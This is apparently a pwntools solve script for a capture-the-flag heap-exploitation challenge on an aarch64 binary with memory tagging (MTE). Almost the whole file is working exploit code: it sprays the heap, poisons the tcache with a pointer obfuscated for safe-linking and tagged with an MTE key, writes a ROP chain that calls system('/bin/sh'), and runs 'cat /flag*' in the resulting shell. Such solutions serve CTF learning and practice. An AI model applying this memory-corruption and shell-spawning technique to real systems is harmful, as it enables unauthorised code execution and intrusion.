#!/usr/bin/env python3
from pwn import *
import time
import sys

"""

"""

if len(sys.argv) < 3:
    print("Usage solve.py <host> <port>")
    exit(1)
_, host, port = sys.argv

context.terminal = ["tmux", "new-window"]
#context.log_level = 'info'

exe = ELF("../dist/mte")
libc = ELF("../src/lib/libc.so.6")

context.binary = exe
io = None

# change -l0 to -l1 for more gadgets
def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l0', filename]).decode().split(' ')]
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val): info(name+" = %#x" % val)
def sla(delim,line): return io.sendlineafter(delim,line)
def sl(line): return io.sendline(line)
def rcu(delim): return io.recvuntil(delim)
def rcv(number): return io.recv(number)
def rcvl(): return io.recvline()

def conn():
    global io
    #if args.GDB:
    #    io = process(["qemu-aarch64","-g","1234",exe.path])
    #elif args.REMOTE:
    io = remote(host, int(port))
    #else:
    #    io = process(["qemu-aarch64",exe.path])
    return io


def alloc(index,size,data):
    sla(b"Print\n",b"1")
    sla(b":\n",str(index).encode())
    sla(b":\n",hex(size).encode())
    sla(b":\n",data)

def free(index):
    sla(b"Print\n",b"2")
    sla(b":\n",str(index).encode())

def edit(index,data):
    sla(b"Print\n",b"3")
    sla(b":\n",str(index).encode())
    sla(b":\n",data)

def print_alloc(index):
    sla(b"Print\n",b"4")
    sla(b":\n",str(index).encode())
    rcu(b": ")
    return rcvl()

def go_exit():
    sla(b"Print\n",b"5")

def obfuscate(p, adr):
    return p^(adr>>12)

while True:
    try:
        conn()

        # grow up heap to bypass mprotect restricted range
        for i in range(500):
            alloc(1,0x100,b"A")

        alloc(2,0x80,b"A")
        alloc(3,0x80,b"B")

        free(2)
        free(3)

        tcache_heap_addr = 0x400005500034ab0 # w/ MTE key (BF)
        #tcache_heap_addr_DBG = int(input("[DBG] KEY : "),16)
        #tcache_heap_adindexdr = tcache_heap_addr_DBG

        info(f'tcache_heap_addr @ {hex(tcache_heap_addr)}')
        #targ = 0x5501813400-16
        #targ = 0x5501813ad0-16
        targ = 0x005501813cf0
        obfu = obfuscate(targ,tcache_heap_addr)

        edit(3,p64(obfu))
        alloc(3,0x80,b"A")

        libc.address = 0x5501860000

        binsh = next(libc.search(b"/bin/sh\x00"))
        gadget = libc.address + 0x0000000000069500 # 0x0000000000069500 : ldr x0, [sp, #0x18] ; ldp x29, x30, [sp], #0x20 ; ret
        system = libc.sym['system']

        data = b"A"*8 + p64(gadget) + p64(0xdead) + p64(system) + p64(0xdead) + p64(binsh)
        #pad = p64(0x4141414141414141)*7
        #alloc(4,0x80,pad[:-1])

        # leak = print_alloc(1)
        # print(leak)

        alloc(4,0x80,data)

        # data = print_alloc(1)
        go_exit()
        time.sleep(1)

        io.sendline(b"cat /flag*")

        io.interactive()
        break
    except:
        io.close()
        continue
"""
b*secure_free+112


"""
